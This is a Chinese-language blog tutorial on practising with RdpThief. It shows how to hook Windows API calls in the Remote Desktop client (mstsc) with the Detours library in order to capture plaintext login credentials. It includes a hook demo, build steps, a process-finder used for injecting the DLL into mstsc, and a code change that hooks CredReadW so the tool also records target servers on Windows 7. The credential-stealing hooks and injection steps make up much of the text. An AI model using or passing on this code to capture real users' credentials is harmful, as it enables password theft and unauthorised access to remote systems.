从mstsc中提取明文凭据-RdpThief实践

简介

尝试使用RdpThief从远程桌面客户端提取明文凭据，通过读取运行过程中mstsc的内存数据，监控API调用，找到后hook对应API，从中导出存储的明文口令。

准备工作

首先先需要安装Detours库。
Detours库用于监视和检测Windows上的API调用，可以用来hook系统API。
这里我用的是vs2015，直接通过命令安装了：

  1. vs2015->工具->NuGet包管理器->程序包管理器控制台 
  2. Install-Package Detours

通过一个小小的demo演示下hook。

  1. #include <Windows.h>
  2. #include <detours.h> //加载detours库
  3. #pragma comment (lib,"detours.lib")
  4. static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox; //根据函数原型来定义要被HOOk的函数（MSDN函数怎么写的你就怎么定义）
  5. int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) { //成功HOOK后的处理函数
  6.     return TrueMessageBox(NULL, L"Hooked", lpCaption, 0); //HOOK messagebox
  7. }
  8. int main()
  9. {
  10.     DetourTransactionBegin(); //初始化
  11.     DetourUpdateThread(GetCurrentThread()); 
  12.     DetourAttach(&(PVOID&)TrueMessageBox, OurMessageBox);  //加载要HOOK的函数
  13.     DetourTransactionCommit(); //开始HOOK
  14.     MessageBox(NULL, L"Hello", L"Hello", 0);
  15.     DetourTransactionBegin(); //HOOK初始化
  16.     DetourUpdateThread(GetCurrentThread()); //刷新本身线程
  17.     DetourDetach(&(PVOID&)TrueMessageBox, OurMessageBox);  //取消HOOK
  18.     DetourTransactionCommit(); //取消HOOK开始
  19. }

编译RdpThief

先去下载项目文件，项目地址https://github.com/0x09AL/RdpThief
vs2015 有可能碰到由于工具集问题导致编译失败的情况，在项目属性中的常规项中修改工具集平台为v140。
编译成功后就可以得到一个dll文件。
接下来就是要将这个dll注入到对一个的mstsc进程里面。

  66. BOOL FindProcessPid(LPCWSTR ProcessName, DWORD& dwPid)
  67. {
  68.     HANDLE hProcessSnap;
  69.     PROCESSENTRY32 pe32;

  71.     // Take a snapshot of all processes in the system.
  72.     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  73.     if (hProcessSnap == INVALID_HANDLE_VALUE)
  74.     {
  75.         return(FALSE);
  76.     }

  78.     pe32.dwSize = sizeof(PROCESSENTRY32);

  80.     if (!Process32First(hProcessSnap, &pe32))
  81.     {
  82.         CloseHandle(hProcessSnap);          // clean the snapshot object
  83.         return(FALSE);
  84.     }

  86.     BOOL    bRet = FALSE;
  87.     do
  88.     {
  89.         if (!lstrcmp(ProcessName, pe32.szExeFile))
  90.         {
  91.             dwPid = pe32.th32ProcessID;
  92.             bRet = TRUE;
  93.             break;
  94.         }

  96.     } while (Process32Next(hProcessSnap, &pe32));

  98.     CloseHandle(hProcessSnap);
  99.     return bRet;
  100. }

编译以后测试下。
用Process Explorer看下是否注入成功。
然后正常登录，无论成功与否，都是会记录下来保存在%temp%/data.bin文件中。

注意

我这里测试的是win10下，根据几个老师傅的测试win7下是不存在SspiPrepareForCredRead这个API，自然就无法将登录服务器的ip记录下来，需要修改RdpThief的代码，通过CredReadW这个API去获取对应的ip。
所以只需要在源代码中增加对CredReadW的hook即可。

  1. static BOOL(WINAPI *OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;
  2. BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)
  3. {
  4.     lpServer = TargetName;
  5.     return OriginalCredReadW(TargetName, Type, Flags, Credential);
  6. }

不要忘了attach加载hook和detach取消hook。
